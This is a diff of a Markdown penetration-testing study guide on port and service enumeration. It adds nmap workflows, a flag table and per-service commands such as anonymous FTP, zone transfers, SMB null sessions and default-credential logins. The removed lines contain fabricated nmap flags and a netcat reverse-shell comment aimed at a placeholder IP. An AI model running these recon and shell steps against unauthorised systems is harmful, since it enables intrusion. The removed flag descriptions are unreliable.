@@ -1,227 +1,161 @@
-# Nmap Deep Enumeration ({target})
+# Enumeration — Ports & Services
 
-Scan beyond the open ports. Expose services, versions, and running applications through aggressive protocol enumeration and OS fingerprinting.
+**Enumeration wins engagements. Slow down here.** The goal: know every open port, its exact service version, and what you can do with it *before* you touch an exploit. `{target}` = victim IP.
 
-## Attack Workflow
+> Methodology: fast full-port sweep → targeted deep scan on found ports → per-service enumeration. Keep every output file — the exam wants evidence and you'll re-reference it.
 
-1.  **Stealth Recon**: Identify live hosts and open ports without alerting IDS.
-2.  **Service Detection**: Resolve open ports to specific services and versions.
-3.  **OS Fingerprinting**: Identify the host operating system.
-4.  **Port Scanning (Full)**: Enumerate all ports, open, closed, and filtered.
-5.  **Protocol Detection**: Deep dive into TCP/IP headers.
-6.  **Host Discovery**: Discover subnets, networks, and adjacent hosts.
-7.  **Version Fingerprinting**: Extract detailed software versions.
-8.  **Traceroute**: Map network hops and find the bottleneck.
+---
 
-## Commands Section
+## Nmap — The Right Way
 
-### Initial Stealth Scan
-Identify live hosts and open ports silently.
+### Stage 1: Fast full TCP port discovery
 ```bash
-nmap -sL -sC -sV --min-rate 1000 --script=default {target}
+# All 65535 ports fast, then feed the open ones into a deep scan
+nmap -p- --min-rate 10000 -T4 -Pn {target} -oN allports.txt
+# Grab just the open ports as a comma list
+ports=$(grep '^[0-9]' allports.txt | grep open | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
+echo $ports
 ```
 
-### Aggressive Service Enumeration
-Resolve open ports to services and versions.
+### Stage 2: Deep scan on the open ports
 ```bash
-nmap -sC -sV -O -v -T4 --open --script=vuln {target}
+# -sC default scripts, -sV version detection, -O OS detection, -A = all of that + traceroute
+nmap -p$ports -sC -sV -O -Pn {target} -oA deep_scan
+# Manual equivalent if you prefer:
+nmap -p$ports -A -Pn {target} -oN deep.txt
 ```
 
-### OS Fingerprinting
-Guess the operating system.
+### UDP — don't skip it (SNMP, DNS, TFTP, IKE live here)
 ```bash
-nmap -O -sV --osg-v46 {target}
+# UDP is slow; scan top ports only
+sudo nmap -sU --top-ports 100 -Pn {target} -oN udp.txt
 ```
 
-### Full Port Enumeration
-Scan all ports (open, closed, filtered).
+### Vuln scripts
 ```bash
-nmap -sS -T4 -p- --script=vuln {target}
+nmap -p$ports --script vuln -Pn {target} -oN vuln.txt
 ```
 
-### Protocol Detection
-Deep scan TCP/IP headers.
+### What the flags ACTUALLY mean (memorise — the exam punishes guessing)
+| Flag | Meaning |
+|------|---------|
+| `-sS` | TCP **SYN / half-open** scan (default when root; stealthier, faster) |
+| `-sT` | TCP **connect** scan (full 3-way handshake; used when non-root) |
+| `-sU` | **UDP** scan |
+| `-sN` / `-sF` / `-sX` | **Null / FIN / Xmas** scans (firewall evasion) |
+| `-sV` | **Service/version** detection |
+| `-sC` | Run **default** NSE scripts (`= --script=default`) |
+| `-O` | **OS** fingerprinting |
+| `-A` | Aggressive: `-sV -sC -O --traceroute` combined |
+| `-p-` | All **65535** ports (`-p1-65535`) |
+| `-Pn` | **Skip host discovery** (treat host as up — needed when ICMP is blocked) |
+| `-sn` | **Ping sweep only**, no port scan (host discovery) |
+| `-n` | **No DNS** resolution (faster, quieter) |
+| `-T0..T5` | Timing: `T0` paranoid (IDS evasion) → `T4` aggressive → `T5` insane |
+| `--min-rate` | Minimum packets/sec (speed) |
+| `-oA <base>` | Output **all three** formats (.nmap/.gnmap/.xml) |
+| `-6` | Scan over **IPv6** |
+
+> Note: `-Pn` is your friend on Windows/AD targets that don't answer ping. `-sn` is the opposite — discovery only.
+
+---
+
+## Per-Service Enumeration Playbook
+
+### 21 — FTP
 ```bash
-nmap -sP -p- --script=vuln {target}
+nmap -p21 --script ftp-anon,ftp-syst {target}
+ftp {target}                     # try user: anonymous / pass: anything
+# Once in: binary; passive; ls -la; mget *
 ```
 
-### Host Discovery
-Find subnets, networks, and adjacent hosts.
+### 22 — SSH
 ```bash
-nmap -sL -sP {target}
+nmap -p22 --script ssh2-enum-algos,ssh-auth-methods {target}
+ssh-audit {target}
+# note the version -> searchsploit; try username enum / weak creds only if in scope
 ```
 
-### Version Fingerprinting
-Get detailed version info.
+### 25 — SMTP
 ```bash
-nmap --version-intensity high -p- {target}
+nmap -p25 --script smtp-commands,smtp-enum-users {target}
+smtp-user-enum -M VRFY -U users.txt -t {target}
 ```
 
-### Traceroute
-Map network hops and find the bottleneck.
+### 53 — DNS
 ```bash
-nmap -T4 -sV -M --traceroute -p- --script=vuln {target}
+dig axfr @{target} corp.local          # zone transfer (jackpot if allowed)
+dnsenum --dnsserver {target} corp.local
 ```
 
-## Tips & Shortcuts
+### 80/443 — HTTP(S)
+```bash
+whatweb http://{target}
+nmap -p80,443 --script http-enum,http-title,http-headers {target}
+# then dir brute + vhost -> see the Web Attacks chapter
+gobuster dir -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
+```
 
-*   `-sS` (SYN Scan): Best for stealth.
-*   `-sA` (Acute Scan): Non-stealth, but faster.
-*   `-sC` (Default Scan): Runs scripts automatically.
-*   `-sV` (Service Scan): Resolves ports to services.
-*   `-sO` (ICMP Scan): Ping scan.
-*   `-O` (OS Scan): OS fingerprinting.
-*   `-T4` (Aggressive Timing): Faster scans.
-*   `-T1` (Slow Timing): Avoid IDS detection.
-*   `-p-` (All Ports): Scan all 65535 ports.
-*   `-p1-1000` (Range): Specific port range.
-*   `--script=default`: Default scripts.
-*   `--script=vuln`: Vulnerability scripts.
-*   `-sN` (Null Scan): No flag to avoid alerting.
-*   `--data-length` (TCP): Specify data length to probe ports.
-*   `--min-rate` (Speed): Adjust scan speed to avoid IDS.
-*   `--min-software-version` (Software): Minimum software version to detect.
-*   `-n` (Hostnames): Don't resolve DNS.
-*   `-4` (TCP): Only scan IPv4.
-*   `-6` (UDP): Only scan IPv6.
+### 111 — RPCbind / NFS
+```bash
+rpcinfo -p {target}
+showmount -e {target}                  # list NFS exports
+sudo mount -t nfs {target}:/export /mnt/nfs -o nolock
+```
+
+### 139/445 — SMB
+```bash
+nxc smb {target}                       # OS, domain, signing at a glance
+smbclient -N -L //{target}/            # null-session share list
+smbmap -H {target}                     # share permissions
+smbmap -H {target} -u {user} -p {pass} -R    # recursive with creds
+enum4linux-ng -A {target}
+nmap -p445 --script smb-vuln* {target} # EternalBlue etc.
+```
+
+### 161 — SNMP (UDP)
+```bash
+snmpwalk -v2c -c public {target}
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target}
+snmpbulkwalk -v2c -c public {target} 1.3.6.1.2.1.25.4.2.1.2   # running processes
+```
+
+### 389/636 — LDAP
+```bash
+ldapsearch -x -H ldap://{target} -s base namingcontexts
+ldapsearch -x -H ldap://{target} -b "DC=corp,DC=local"
+```
+
+### 3306 / 5432 / 1433 — Databases
+```bash
+mysql -h {target} -u root -p
+psql -h {target} -U postgres
+impacket-mssqlclient {domain}/{user}:{pass}@{target} -windows-auth
+```
+
+### 3389 — RDP
+```bash
+nmap -p3389 --script rdp-ntlm-info {target}     # leaks hostname/domain
+xfreerdp /u:{user} /p:{pass} /v:{target} /cert:ignore /dynamic-resolution
+```
+
+---
+
+## Enumeration Checklist (tick every box)
+
+- [ ] Full TCP `-p-` scan completed and saved
+- [ ] Deep `-sC -sV` scan on all open ports
+- [ ] UDP top-100 scanned
+- [ ] Every service version fed to `searchsploit`
+- [ ] SMB: null session, shares, signing status
+- [ ] Web: whatweb, dir brute, vhost fuzz, source/robots.txt/comments
+- [ ] Default creds tried on every login you found
+- [ ] All output files kept for the report
 
 ## Common Mistakes
 
-*   **Ignoring `-T1`**: High timing (-T4) can trigger IDS on some networks.
-*   **Scanning Too Fast**: High scan rates can cause false negatives or alerts.
-*   **Missing `-sS`**: SYN scans are faster and stealthier than TCP Connect.
-*   **Scanning Closed Ports**: Use `-sP` to find live hosts before scanning.
-*   **Ignoring `-n`**: DNS resolution can leak info to the target.
-*   **No `-sC`**: Default scans can miss useful scripts.
-*   **Not Using `-p-`**: Only scanning common ports (1-1000) misses rare ports.
-*   **Missing `-O`**: OS fingerprinting is crucial for attack planning.
-*   **Ignoring `-T4`**: Aggressive timing is needed for speed.
-
-## Mini Automation Scripts
-
-### Bash Script: Deep Nmap Scan
-Automates a full deep scan with timing adjustments.
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-nmap -sL -sC -sV --min-rate 1000 --script=default -O -T4 {target}
-```
-
-### Python Script: Nmap Wrapper
-Adds custom scripts to the nmap scan.
-```python
-#!/usr/bin/env python3
-import subprocess
-import sys
-
-def run_nmap(target, scripts):
-    cmd = ["nmap", "-sC", "-sV", "-T4", "-p-", f"--script={','.join(scripts)}", target]
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    print(result.stdout)
-
-if __name__ == "__main__":
-    target = sys.argv[1] if len(sys.argv) > 1 else "{target}"
-    scripts = ["vuln", "safe", "http-headers"]
-    run_nmap(target, scripts)
-```
-
-### Bash Script: Port Range Scanner
-Scans a specific port range.
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-START="${2:-1}"
-END="${3:-1024}"
-nmap -sS -T4 -p${START}-${END} --script=vuln {target}
-```
-
-### Bash Script: Subnet Scanner
-Finds live hosts in a subnet.
-```bash
-#!/bin/bash
-SUBNET="${1:-192.168.1.0/24}"
-nmap -sL -sC -sV --min-rate 1000 --script=default -O -T4 -p- {SUBNET}
-```
-
-### Bash Script: Reverse Shell via Nmap
-Uses Nmap to get a reverse shell.
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-REVERSE_IP="${2:-127.0.0.1}"
-PORT="${3:-8080}"
-nmap -sS -T4 -p- --script=vuln {target}
-# Then use nc -e /bin/bash <reversing_ip> <port>
-```
-
-### Bash Script: Service Discovery
-Identifies services and versions.
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-nmap -sC -sV -O -v -T4 --open --script=vuln {target}
-```
-
-### Bash Script: Port Scanner
-Scans all ports.
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-nmap -sS -T4 -p- --script=vuln {target}
-```
-
-### Bash Script: Host Discovery
-Finds subnets, networks, and adjacent hosts.
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-nmap -sL -sP {target}
-```
-
-### Bash Script: OS Fingerprinting
-Guesstims the operating system.
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-nmap -O -sV --osg-v46 {target}
-```
-
-### Bash Script: Full Port Enumeration
-Scans all ports (open, closed, filtered).
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-nmap -sS -T4 -p- --script=vuln {target}
-```
-
-### Bash Script: Protocol Detection
-Deep scan TCP/IP headers.
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-nmap -sP -p- --script=vuln {target}
-```
-
-### Bash Script: Host Discovery
-Finds subnets, networks, and adjacent hosts.
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-nmap -sL -sP {target}
-```
-
-### Bash Script: Version Fingerprinting
-Get detailed version info.
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-nmap --version-intensity high -p- {target}
-```
-
-### Bash Script: Traceroute
-Map network hops and find the bottleneck.
-```bash
-#!/bin/bash
-TARGET="${1:-{target}}"
-nmap -T4 -sV -M --traceroute -p- --script=vuln {target}
-```
+- **Scanning only the top 1000 ports.** The flag is on `12345`. Always `-p-`.
+- **Forgetting `-Pn`** on hosts that block ICMP → nmap reports "host down" and skips everything.
+- **Ignoring UDP.** SNMP with `public` is a free win people miss.
+- **Not versioning services.** `-sV` output is what turns into a `searchsploit` hit.
+- **Rushing to exploit.** 80% of the work is enumeration; the exploit is the easy part.
